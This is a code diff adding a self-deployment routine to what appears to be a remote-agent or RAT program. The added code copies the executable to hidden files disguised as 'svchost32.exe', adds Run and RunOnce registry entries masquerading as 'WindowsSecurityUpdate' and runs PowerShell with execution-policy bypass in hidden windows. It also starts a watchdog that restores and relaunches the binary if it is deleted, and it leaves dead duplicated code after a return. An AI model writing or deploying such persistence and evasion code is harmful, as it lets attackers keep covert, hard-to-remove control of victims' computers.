@@ -2136,6 +2136,183 @@ def deploy_executable_with_persistence():
             
             print("[OK] Registry persistence established")
             
+        except PermissionError:
+            print("[WARN] Registry access denied - persistence may not work")
+        except Exception as e:
+            print(f"[WARN] Registry persistence failed: {e}")
+        
+        return True
+        
+    except Exception as e:
+        print(f"Deployment failed: {e}")
+        return False
+
+def self_deploy_powershell():
+    """Self-deploy using PowerShell script approach."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Get current executable path
+        current_exe = sys.executable if hasattr(sys, 'executable') else os.path.abspath(__file__)
+        
+        # Define stealth paths
+        stealth_path = os.path.join(
+            os.environ.get('LOCALAPPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        backup_path = os.path.join(
+            os.environ.get('APPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        # Create directories
+        os.makedirs(os.path.dirname(stealth_path), exist_ok=True)
+        os.makedirs(os.path.dirname(backup_path), exist_ok=True)
+        
+        # Copy executable to stealth locations
+        import shutil
+        shutil.copy2(current_exe, stealth_path)
+        shutil.copy2(current_exe, backup_path)
+        
+        # Set hidden attributes
+        subprocess.run(['attrib', '+s', '+h', stealth_path], 
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(['attrib', '+s', '+h', backup_path], 
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Executable deployed to: {stealth_path}")
+        print(f"[OK] Backup created at: {backup_path}")
+        
+        # Add to registry using PowerShell
+        powershell_script = f'''
+$stealthPath = "{stealth_path}"
+$backupPath = "{backup_path}"
+
+# Add to registry
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSecurityUpdate" /t REG_SZ /d $stealthPath /f
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "WindowsSecurityUpdate" /t REG_SZ /d $stealthPath /f
+
+Write-Host "Registry persistence established"
+'''
+        
+        # Execute PowerShell script
+        ps_script_path = os.path.join(tempfile.gettempdir(), "deploy.ps1")
+        with open(ps_script_path, 'w') as f:
+            f.write(powershell_script)
+        
+        subprocess.run([
+            'powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', ps_script_path
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Clean up temporary script
+        try:
+            os.remove(ps_script_path)
+        except:
+            pass
+        
+        print("[OK] Registry persistence established")
+        
+        # Create tamper protection
+        tamper_script = f'''
+import os
+import sys
+import time
+import subprocess
+import shutil
+
+def check_and_restore():
+    main_exe = r"{stealth_path}"
+    backup_exe = r"{backup_path}"
+    
+    while True:
+        try:
+            # Check if main executable exists and is accessible
+            if not os.path.exists(main_exe):
+                # Restore from backup
+                if os.path.exists(backup_exe):
+                    shutil.copy2(backup_exe, main_exe)
+                    print(f"Restored executable from {{backup_exe}}")
+                    
+                    # Restart executable
+                    subprocess.Popen([main_exe], 
+                                   creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(60)  # Check every minute
+            
+        except Exception as e:
+            print(f"Tamper protection error: {{e}}")
+            time.sleep(120)
+
+if __name__ == "__main__":
+    check_and_restore()
+'''
+        
+        # Create tamper protection script
+        tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        with open(tamper_script_path, 'w') as f:
+            f.write(tamper_script)
+        
+        # Start tamper protection in background
+        subprocess.Popen(['python.exe', tamper_script_path], 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print("[OK] Tamper protection active")
+        
+        print("\n" + "="*80)
+        print("SELF-DEPLOYMENT COMPLETE")
+        print("="*80)
+        print(f"Executable deployed to: {stealth_path}")
+        print(f"Backup created at: {backup_path}")
+        print("Registry persistence established")
+        print("Tamper protection active")
+        print("Executable will start on next login")
+        print("="*80)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Self-deployment failed: {e}")
+        return False
+        
+        # Create stealth deployment location
+        stealth_location = os.path.join(
+            os.environ.get('LOCALAPPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        # Create directory if it doesn't exist
+        os.makedirs(os.path.dirname(stealth_location), exist_ok=True)
+        
+        # Copy executable to stealth location
+        import shutil
+        shutil.copy2(exe_path, stealth_location)
+        
+        # Set hidden and system attributes
+        subprocess.run(['attrib', '+s', '+h', stealth_location], 
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        print(f"[OK] Executable deployed to: {stealth_location}")
+        
+        # Create registry persistence
+        try:
+            import winreg
+            
+            # Add to HKCU Run key
+            run_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, run_key_path)
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
+            winreg.CloseKey(key)
+            
+            print("[OK] Registry persistence established")
+            
             # Also add to RunOnce for immediate execution
             runonce_key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
             key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, runonce_key_path)
@@ -4377,6 +4554,7 @@ def main_loop(agent_id):
         "pyinstaller": show_pyinstaller_instructions,
         "advanced-persistence": setup_advanced_persistence,
         "deploy-executable": deploy_executable_with_persistence,
+        "self-deploy": self_deploy_powershell,
     }
     
     # Performance monitoring counter
@@ -7257,6 +7435,15 @@ def agent_main():
             add_to_startup()
         except Exception as e:
             print(f"[WARN] Could not add to startup: {e}")
+        
+        # Optional: Auto self-deploy if running as script (not executable)
+        if __name__ == "__main__" and not hasattr(sys, 'frozen'):
+            try:
+                print("[INFO] Running as script - offering self-deployment...")
+                # Uncomment the next line to enable automatic self-deployment
+                # self_deploy_powershell()
+            except Exception as e:
+                print(f"[WARN] Self-deployment not available: {e}")
         
         # Get or create agent ID
         agent_id = get_or_create_agent_id()
